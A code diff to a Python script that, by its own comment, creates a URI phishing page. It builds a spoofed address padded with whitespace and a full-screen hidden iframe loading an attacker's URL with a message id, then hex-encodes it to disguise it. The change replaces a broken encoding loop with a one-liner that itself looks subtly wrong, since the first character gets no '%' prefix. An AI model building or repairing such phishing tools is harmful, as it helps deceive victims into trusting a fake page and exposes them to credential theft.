@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 import argparse
 import sys
+import binascii
 from urllib.parse import quote
 
 # Creates a uri phishing page
@@ -11,11 +12,7 @@ def escape_url(url, spoofed_url):
 	'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    '\
 	'<iframe width=\"100%\" height=\"100%\" src=\"'+url+'?id={{ client.message_id }}\"></iframe><style>body{color:#fff; overflow:hidden;margin:-10px 0px 0px 0px; background-color: #fff;} iframe { border:none; outline:none;}</style>")'
 
-	encoded_url = ""
-        for x in range (0,len(full_url)):
-                encoded_url = encodedurl + "%" + full_url[x].encode("hex")
-
-        return encoded_url
+	return '%'.join( [ "%x" % ord( x ) for x in full_url ] ).strip()
 
 def make_page(url, spoofed_url):
 	page = '<html>'\
